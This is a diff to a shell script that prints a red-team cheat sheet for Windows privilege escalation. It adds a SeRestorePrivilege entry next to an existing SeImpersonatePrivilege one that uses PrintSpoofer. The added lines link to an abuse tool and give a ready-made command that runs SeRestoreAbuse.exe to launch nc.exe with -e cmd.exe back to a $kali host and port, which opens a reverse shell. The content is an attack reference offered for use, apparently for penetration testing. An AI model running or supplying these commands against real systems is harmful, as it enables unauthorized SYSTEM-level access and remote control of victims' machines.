@@ -93,3 +93,9 @@ echo -e "${Frame}###${End} ${Title}SeImpersonatePrivilege${End} ${Frame}###${End
 echo -e "${Point} .\PrintSpoofer64.exe -i -c cmd"
 echo -e ""
 
+
+echo -e "${Frame}###${End} ${Title}SeRestorePrivilege${End} ${Frame}###${End}"
+echo -e "${Link}https://github.com/xct/SeRestoreAbuse.git${End}"
+echo -e "${Link}https://github.com/dxnboy/redteam.git${End}"
+echo -en "${Point}" && echo ".\SeRestoreAbuse.exe \"cmd /c C:\path\to\nc.exe \$kali \$port -e cmd.exe\""
+echo -e ""
